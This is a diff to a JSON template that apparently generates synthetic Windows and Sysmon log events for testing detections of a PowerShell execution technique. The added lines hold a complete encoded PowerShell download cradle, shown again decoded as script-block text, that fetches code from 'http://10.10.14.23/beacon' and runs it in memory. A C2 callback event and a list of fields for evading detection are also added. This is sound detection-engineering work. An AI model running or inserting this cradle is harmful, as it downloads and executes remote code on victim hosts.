@@ -4,24 +4,55 @@
   "tactic": "Execution",
   "events": [
     {
+      "note": "PowerShell download cradle — IEX + WebClient is the classic in-memory execution pattern",
       "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
       "template": {
         "EventCode": 1,
         "EventDescription": "Process Create",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "CommandLine": "powershell.exe -NoProfile -NonInteractive -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7AA==",
+        "CommandLine": "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJABjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgBVAHMAZQByAC0AQQBnAGUAbgB0ACIALAAiAE0AbwB6AGkAbABsAGEAIgApADsAIABJAEUAWAAgACgAJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMwAvAGIAZQBhAGMAbwBuACIAKQApAA==",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "User": "{target_user}",
-        "Hashes": "SHA256=AABBCCDD112233440000000000000000DEADBEEF00000000CAFEBABE00000001",
+        "User": "CORP\\{target_user}",
         "IntegrityLevel": "High",
-        "CurrentDirectory": "C:\\Users\\{target_user}\\AppData\\Local\\Temp\\"
+        "CurrentDirectory": "C:\\Users\\{target_user}\\",
+        "Hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F"
+      },
+      "count": 1,
+      "spread_seconds": 1
+    },
+    {
+      "note": "Script block logging (Event 4104) — shows decoded content with download cradle",
+      "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
+      "template": {
+        "EventCode": 4104,
+        "ScriptBlockText": "$c=New-Object System.Net.WebClient; $c.Headers.Add(\"User-Agent\",\"Mozilla\"); IEX ($c.DownloadString(\"http://10.10.14.23/beacon\"))",
+        "Path": "",
+        "MessageNumber": 1,
+        "MessageTotal": 1
       },
       "count": 1,
       "spread_seconds": 2
+    },
+    {
+      "note": "C2 callback — PowerShell opens network connection to attacker infrastructure",
+      "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "template": {
+        "EventCode": 3,
+        "EventDescription": "Network connection",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "User": "CORP\\{target_user}",
+        "DestinationIp": "{attacker_ip}",
+        "DestinationPort": 80,
+        "DestinationHostname": "",
+        "Protocol": "tcp",
+        "Initiated": "true"
+      },
+      "count": 1,
+      "spread_seconds": 3
     }
   ],
   "mutation_hints": {
-    "evadable_fields": ["CommandLine", "ParentImage", "Image", "IntegrityLevel"],
-    "objective": "Execute arbitrary PowerShell payload on target host"
+    "evadable_fields": ["CommandLine", "ParentImage", "DestinationPort", "IntegrityLevel"],
+    "objective": "Execute in-memory payload to establish C2 channel without writing to disk"
   }
 }
